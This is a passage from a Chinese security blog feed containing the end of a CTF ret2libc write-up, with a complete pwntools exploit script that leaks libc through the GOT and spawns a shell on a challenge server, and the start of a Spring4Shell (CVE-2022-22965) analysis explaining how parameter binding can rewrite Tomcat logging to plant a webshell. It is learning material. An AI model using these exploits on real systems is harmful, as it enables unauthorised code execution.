这里对plt和got表做一个最基础的解释，属于我个人的理解，plt表用于记录一系列函数名和跳转代码，一旦对动态链接库中的函数做了调用，实际调用的就是plt表的地址，然后再跳转到该函数。got表记录了函数名，但未记录地址，一旦程序开始运行，链接时就把内存中函数对应的地址填到got表上记录的对应地址。</p><h2 id="0x03-攻击过程"><a href="#0x03-攻击过程" class="headerlink" title="0x03 攻击过程"></a>0x03 攻击过程</h2><p>分两个阶段进行攻击：</p><h3 id="阶段一："><a href="#阶段一：" class="headerlink" title="阶段一："></a>阶段一：</h3><p><strong>目的：</strong>由于没有开pie，因此动态链接库每一次的位置都是固定的，我们需要泄露动态链接库中的一个函数，这样就可以通过相对位置计算出system函数的位置。</p><p><strong>过程：</strong></p><ol><li>覆盖返回地址，替换为write函数地址；</li><li>write函数需要传参，第一个参数是1，第二个参数是要write的字符串地址，那么我们这里只要将wirte函数got表的地址传入，输出该地址对应内容就是内存中write的实际地址；</li><li>为了让程序还能运行，我们还需要正常的返回main函数；</li></ol><p><strong>结果：</strong>此时我们就有了libc在内存中的相对地址（可以通过write函数相对位置求出来）。</p><h3 id="阶段二："><a href="#阶段二：" class="headerlink" title="阶段二："></a>阶段二：</h3><p><strong>目的：</strong>调用libc中的system函数，并利用libc中的字符串实现/bin/sh</p><p><strong>过程:</strong></p><p>先找字符串，由于我么已经有libc_32.so.6文件了，使用命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings -a -t x libc_32.so.6 | grep &quot;/bin/sh&quot; </span><br></pre></td></tr></table></figure><p>然后：</p><ol><li>按照本地的地址计算出system函数的地址；</li><li>直接调用，传参传上述命令输出的字符串的地址，即可反弹shell；</li></ol><h2 id="0x04-exp分析"><a href="#0x04-exp分析" class="headerlink" title="0x04 exp分析"></a>0x04 exp分析</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">sh = remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">61889</span>)</span><br><span class="line"><span class="comment">#sh=process(&#x27;./level3&#x27;)</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#get func address</span></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;elf-writegot:&#x27;</span>,<span class="built_in">hex</span>(write_got))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x88</span> + p32(<span class="number">0xdeadbeef</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line"> </span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Input:\n&quot;</span>,payload)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#leak write&#x27;s addr in got</span></span><br><span class="line">write_got_addr = u32(sh.recv()[:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;write_got address is&#x27;</span>,<span class="built_in">hex</span>(write_got_addr))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#leak libc&#x27;s addr</span></span><br><span class="line">libc_addr = write_got_addr - libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;libc address is&#x27;</span>,<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#get system&#x27;s addr</span></span><br><span class="line">sys_addr = libc_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;system address is&#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#get bin/sh &#x27;s addr    strings -a -t x libc_32.so.6 | grep &quot;/bin/sh&quot;</span></span><br><span class="line"><span class="comment">#libc.search(&quot;/bin/sh&quot;).next()</span></span><br><span class="line">bin_sh_addr = libc_addr + <span class="number">0x15902b</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;/bin/sh address is&#x27;</span>,<span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#get second payload</span></span><br><span class="line">payload0 = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x88</span> + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(bin_sh_addr)</span><br><span class="line"> </span><br><span class="line">sh.sendline(payload0)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>大佬说让从ctfwiki学起，我也感觉基础比较薄弱，开始进军ctfwiki吧~</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2022-22965漏洞分析复现</title>
      <link href="/2022/04/17/CVE-2022-22965%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/04/17/CVE-2022-22965%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2022-22965漏洞分析复现"><a href="#CVE-2022-22965漏洞分析复现" class="headerlink" title="CVE-2022-22965漏洞分析复现"></a>CVE-2022-22965漏洞分析复现</h1><p>​        <strong>注：本文参考极盾科技相关文章，有非常多引用，但是由于太多了影响阅读因此只在标题做了标明，因此本文仅供自行学习，若有需要，可以参考原链接：</strong></p><p><a href="https://www.aqniu.com/industry/82365.html">https://www.aqniu.com/industry/82365.html</a></p><p>先来一张java现状，lol：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/img_1.png" alt="awkward situation "></p><h2 id="0x01-漏洞基本情况"><a href="#0x01-漏洞基本情况" class="headerlink" title="0x01 漏洞基本情况"></a>0x01 漏洞基本情况</h2><h3 id="基本概况："><a href="#基本概况：" class="headerlink" title="基本概况："></a>基本概况：</h3><blockquote><p>After Spring Cloud, on March 29, another heavyweight vulnerability of Spring broke out on the Internet: Spring Core RCE</p><p>On March 31 Spring released new versions which fixes the vulnerability. See section <a href="https://github.com/TheGejr/SpringShell#patching">Patching</a>.</p><p>On March 31 a <a href="https://tanzu.vmware.com/security/cve-2022-22965">CVE-number was finally assigned to the vulnerability</a> with a <a href="https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H">CVSS score 9.8 (CRITICAL)</a></p></blockquote><h3 id="环境需求："><a href="#环境需求：" class="headerlink" title="环境需求："></a>环境需求：</h3><ol><li>JDK9及其以上版本；</li><li>使⽤了Spring-beans包； </li><li>使⽤了Spring参数绑定； </li><li>Spring参数绑定使⽤的是⾮基本参数类型，例如⼀般的POJO即可；</li></ol><p>简单的说，就是java+maven+tomcat三件套，不做赘述。</p><h2 id="0x02-背景知识（部分引用）："><a href="#0x02-背景知识（部分引用）：" class="headerlink" title="0x02 背景知识（部分引用）："></a>0x02 背景知识（部分引用）：</h2><h3 id="一、springMVC参数绑定基础"><a href="#一、springMVC参数绑定基础" class="headerlink" title="一、springMVC参数绑定基础"></a>一、springMVC参数绑定基础</h3><p>为了方便编程，SpringMVC支持将HTTP请求中的的请求参数或者请求体内容，根据Controller方法的参数，自动完成类型转换和赋值。之后，Controller方法就可以直接使用这些参数，避免了需要编写大量的代码从HttpServletRequest中获取请求数据以及类型转换。下面是一个简单的示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/addUser&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> <span class="function">String <span class="title">addUser</span><span class="params">(User user)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Department department;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Department <span class="title">getDepartment</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> department;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDepartment</span><span class="params">(Department department)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.department = department;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Department</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​        这里这个程序是什么呢？就是说当我们请求了<code>/addUser?name=test&amp;department.name=SEC</code>的时候，虽然我们没有给controller中的user赋值，但是我们上文中的这个test和SEC会直接赋值到user对象上，然后作为参数传入，这就是所谓的参数绑定。<br>​        那么，我们可以看到user对象里还嵌套了一层department对象，在这种情况下依然能够赋值成功，就说明SpringMVC的参数绑定是支持多层嵌套的，换言之，Spring会构造一个调用链，以实现这样的多层赋值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User.getDepartment()</span><br><span class="line">    Department.setName()</span><br></pre></td></tr></table></figure><p>​        也就是，在为user中department赋值的调用链如上，如果调用链的层数更多，当然也是同理的！</p><p>​        那么，我们提到的这个参数绑定是由谁实现的呢？SpringMVC实现参数绑定的主要类和方法是<code>WebDataBinder.doBind(MutablePropertyValues)</code>。</p><h3 id="二、Bean实现对属性的读写"><a href="#二、Bean实现对属性的读写" class="headerlink" title="二、Bean实现对属性的读写"></a>二、Bean实现对属性的读写</h3><h4 id="1、BeanWrapper"><a href="#1、BeanWrapper" class="headerlink" title="1、BeanWrapper"></a>1、BeanWrapper</h4><p>​        在Spring中，<code>BeanWrapper</code>接口是对Bean的包装，其中定义了大量可以非常方便的方法对Bean的属性进行访问和设置。<code>BeanWrapperImpl</code>类是<code>BeanWrapper</code>接口的默认实现类，<code>BeanWrapperImpl.wrappedObject</code>属性就是被包装的Bean对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.beans.BeanWrapper;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.BeanWrapperImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BeanWrapperDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setName(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">        Department department = <span class="keyword">new</span> Department();</span><br><span class="line">        department.setName(<span class="string">&quot;SEC&quot;</span>);</span><br><span class="line">        user.setDepartment(department);</span><br><span class="line"></span><br><span class="line">        BeanWrapper userBeanWrapper = <span class="keyword">new</span> BeanWrapperImpl(user);</span><br><span class="line">        userBeanWrapper.setAutoGrowNestedPaths(<span class="keyword">true</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;userBeanWrapper: &quot;</span> + userBeanWrapper);</span><br><span class="line">        <span class="comment">//userBeanWrapper: org.springframework.beans.BeanWrapperImpl: wrapping object [cn.jidun.User@1d371b2d]</span></span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Before modification: &quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;user.name: &quot;</span> + userBeanWrapper.getPropertyValue(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">        <span class="comment">//user.name: foo</span></span><br><span class="line">        System.out.println(<span class="string">&quot;user.department.name: &quot;</span> + userBeanWrapper.getPropertyValue(<span class="string">&quot;department.name&quot;</span>));</span><br><span class="line">        <span class="comment">//user.department.name: SEC</span></span><br><span class="line"></span><br><span class="line">        userBeanWrapper.setPropertyValue(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;bar&quot;</span>);</span><br><span class="line">        userBeanWrapper.setPropertyValue(<span class="string">&quot;department.name&quot;</span>, <span class="string">&quot;IT&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;After modification: &quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;user.name: &quot;</span> + userBeanWrapper.getPropertyValue(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">        <span class="comment">//user.name: bar</span></span><br><span class="line">        System.out.println(<span class="string">&quot;user.department.name: &quot;</span> + userBeanWrapper.getPropertyValue(<span class="string">&quot;department.name&quot;</span>));</span><br><span class="line">        user.department.name: IT</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​        从上面的案例中可以看到，调用<code>BeanWrapper</code>类的<code>getPropertyValue()</code>函数可以实现对象属性的读操作，而<code>setPropertyValue()</code>函数可以实现对象属性的写操作。</p><p>​        那么我们进一步深究，这些函数的具体实现是通过什么呢？其下层实现是通过<code>PropertyDescriptor</code>类完成的。</p><h4 id="2、PropertyDescriptor"><a href="#2、PropertyDescriptor" class="headerlink" title="2、PropertyDescriptor"></a>2、PropertyDescriptor</h4><p>​        <code>PropertyDescriptor</code>是JDK自带的<code>java.beans</code>包下的类，意为属性描述器，用于获取符合Java Bean规范的对象属性和get/set方法。下面是一个简单的例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.beans.BeanInfo;</span><br><span class="line"><span class="keyword">import</span> java.beans.Introspector;</span><br><span class="line"><span class="keyword">import</span> java.beans.PropertyDescriptor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PropertyDescriptorDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setName(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        BeanInfo userBeanInfo = Introspector.getBeanInfo(User.class);</span><br><span class="line">        <span class="comment">//获取user类的BeanInfo</span></span><br><span class="line">        PropertyDescriptor[] descriptors = userBeanInfo.getPropertyDescriptors();</span><br><span class="line">        <span class="comment">//获取user类每个属性的Descriptor</span></span><br><span class="line">        PropertyDescriptor userNameDescriptor = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">for</span> (PropertyDescriptor descriptor : descriptors) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (descriptor.getName().equals(<span class="string">&quot;name&quot;</span>)) &#123;<span class="comment">//获取name属性的Descriptor</span></span><br><span class="line">                userNameDescriptor = descriptor;</span><br><span class="line">                System.out.println(<span class="string">&quot;userNameDescriptor: &quot;</span> + userNameDescriptor);</span><br><span class="line">                <span class="comment">//userNameDescriptor: java.beans.PropertyDescriptor[name=name; values=&#123;expert=false; visualUpdate=false; hidden=false; enumerationValues=[Ljava.lang.Object;@5cb9f472; required=false&#125;; propertyType=class java.lang.String; readMethod=public java.lang.String cn.jidun.User.getName(); writeMethod=public void cn.jidun.User.setName(java.lang.String)]</span></span><br><span class="line">                <span class="comment">//输出了一大串，可以看到最下面输出了name属性的读写方法。</span></span><br><span class="line">                </span><br><span class="line">                System.out.println(<span class="string">&quot;Before modification: &quot;</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;user.name: &quot;</span> + userNameDescriptor.getReadMethod().invoke(user));</span><br><span class="line">                <span class="comment">//user.name: foo</span></span><br><span class="line">                <span class="comment">//对于读方法的调用</span></span><br><span class="line">                </span><br><span class="line">                userNameDescriptor.getWriteMethod().invoke(user, <span class="string">&quot;bar&quot;</span>);</span><br><span class="line">                <span class="comment">//对于写方法的调用</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;After modification: &quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;user.name: &quot;</span> + userNameDescriptor.getReadMethod().invoke(user));</span><br><span class="line">        <span class="comment">//user.name: bar</span></span><br><span class="line">        <span class="comment">//经过了写入操作，果然变了，证明写入操作是有效的</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​        可以看到，对于上述方法的调用果然要比BeanWrapper要复杂的多，换言之就是封装程度低，也就是处于更加底层的位置了。</p><p>​        通过这一部分，我们学到Spring中Bean对象由<strong>BeanWrapper</strong>包装，然后其下层的实现是由<strong>PropertyDescriptor</strong>作为储存每一个属性的<strong>getter</strong>和<strong>setter</strong>的集合。</p><h3 id="三、Tomcat日志"><a href="#三、Tomcat日志" class="headerlink" title="三、Tomcat日志"></a>三、Tomcat日志</h3><p>​            <code>Valve</code>是tomcat中用于处理请求和响应的一种结构，tomcat通过组合多个<code>Valve</code>的<code>Pipeline</code>（管道队列），来实现按次序对请求和响应进行一系列的处理。其中<code>AccessLogValve</code>的作用是，用来记录访问日志（<code>access_log</code>）。Tomcat的<code>server.xml</code>中默认配置了<code>AccessLogValve</code>，因此所有部署在Tomcat中的Web应用均会执行该<code>Valve</code>，内容如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Valve</span> <span class="attr">className</span>=<span class="string">&quot;org.apache.catalina.valves.AccessLogValve&quot;</span> <span class="attr">directory</span>=<span class="string">&quot;logs&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">               <span class="attr">prefix</span>=<span class="string">&quot;localhost_access_log&quot;</span> <span class="attr">suffix</span>=<span class="string">&quot;.txt&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">               <span class="attr">pattern</span>=<span class="string">&quot;%h %l %u %t <span class="symbol">&amp;quot;</span>%r<span class="symbol">&amp;quot;</span> %s %b&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>其中属性意义如下：</p><ul><li>directory：access_log文件输出目录。</li><li>prefix：access_log文件名前缀。</li><li>pattern：access_log文件内容格式。</li><li>suffix：access_log文件名后缀。</li><li>fileDateFormat：access_log文件名日期后缀，默认为<code>.yyyy-MM-dd</code>。</li></ul><p>​        那么通过这些背景知识，我们大致也就可以猜到，这个漏洞就是通过上述的mvc属性绑定，更改了<code>AccessLogValue</code>，以达到在服务器端webshell写入。</p><h2 id="0x03-复现过程"><a href="#0x03-复现过程" class="headerlink" title="0x03 复现过程"></a>0x03 复现过程</h2><p>复现吧！</p><p>网上流传最多的来自： <a href="https://github.com/BobTheShoplifter/Spring4Shell-POC/blob/0c557e85ba903c7ad6f50c0306f6c8271736c35e/poc.py%E7%9A%84poc%E6%88%90%E5%8A%9F%E7%8E%87%E5%92%8C%E5%AF%B9%E4%BA%8E%E7%89%88%E6%9C%AC%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7%E8%BE%83%E4%BD%8E%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%8F%82%E7%9C%8B%E4%B8%8B%E9%9D%A2%E4%B8%80%E9%83%A8%E5%88%86%E6%88%91%E7%BB%99%E5%87%BA%E7%9A%84poc%E3%80%82">https://github.com/BobTheShoplifter/Spring4Shell-POC/blob/0c557e85ba903c7ad6f50c0306f6c8271736c35e/poc.py的poc成功率和对于版本的兼容性较低，可以参看下面一部分我给出的poc。</a></p><h3 id="一、实验环境"><a href="#一、实验环境" class="headerlink" title="一、实验环境"></a>一、实验环境</h3><p>操作系统：<strong>Win10</strong>或<strong>Linux</strong>系统都可</p><p>JDK版本：Java(TM) SE Runtime Environment (build <strong>15.0.2</strong>+7-27)</p><p>tomcat版本：apache-tomcat-<strong>9.0.60</strong>（注意要在<strong>9.0.62</strong>以前！）</p><p>springboot：<strong>2.6.3</strong></p><h3 id="二、代码编写"><a href="#二、代码编写" class="headerlink" title="二、代码编写"></a>二、代码编写</h3><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220408161635154.png" alt="image-20220408161635154" style="zoom: 67%;" /><p>​        写一个<strong>user</strong>实体类，随便给个属性，设置上get和set方法，然后提供一个添加用户的接口（<strong>UserController</strong>），最后提供一个Springboot的启动类（<strong>ApplicationMain</strong>），实现起来比较简单，如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.lu.pojo.User;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/addUser&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> <span class="function">String <span class="title">addUser</span><span class="params">(User user)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.builder.SpringApplicationBuilder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.web.servlet.support.SpringBootServletInitializer;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ApplicationMain</span> <span class="keyword">extends</span> <span class="title">SpringBootServletInitializer</span> 